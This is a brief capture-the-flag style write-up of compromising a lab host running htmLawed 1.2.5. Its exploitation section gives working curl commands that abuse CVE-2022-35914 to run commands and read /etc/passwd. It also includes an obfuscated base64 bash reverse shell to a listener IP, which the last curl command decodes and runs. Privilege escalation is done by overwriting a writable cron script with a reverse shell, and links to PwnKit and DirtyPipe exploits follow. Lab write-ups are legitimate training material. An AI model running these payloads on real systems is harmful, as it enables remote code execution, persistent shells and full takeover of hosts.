#Pwned! 
```IP
192.168.175.190
```
# Enumeration

## HTTP 80
Htmlawed 1.2.5

# Exploitation
https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
```
curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.175.190/index.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
```
```
echo "/bin/bash -i >& /dev/tcp/192.168.45.237/4444 0>&1" |base64
```
```
curl -s -d 'sid=foo&hhook=exec&text=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjM3LzQ0NDQgMD4mMQo=|base64 -d|bash' -b 'sid=foo' http://192.168.175.190/index.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
```
# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241128101408.png?raw=true)
with pspy64
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241128104452.png?raw=true)
we see that /var/www/cleanup.sh is executing
we have write permissions over this script so we substitute it for a reverse shell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241128110152.png?raw=true)
and we are root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241128110204.png?raw=true)
## Automated

### Peass

https://github.com/ly4k/PwnKit
failed
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

### Mimikatz

# Lateral Movement

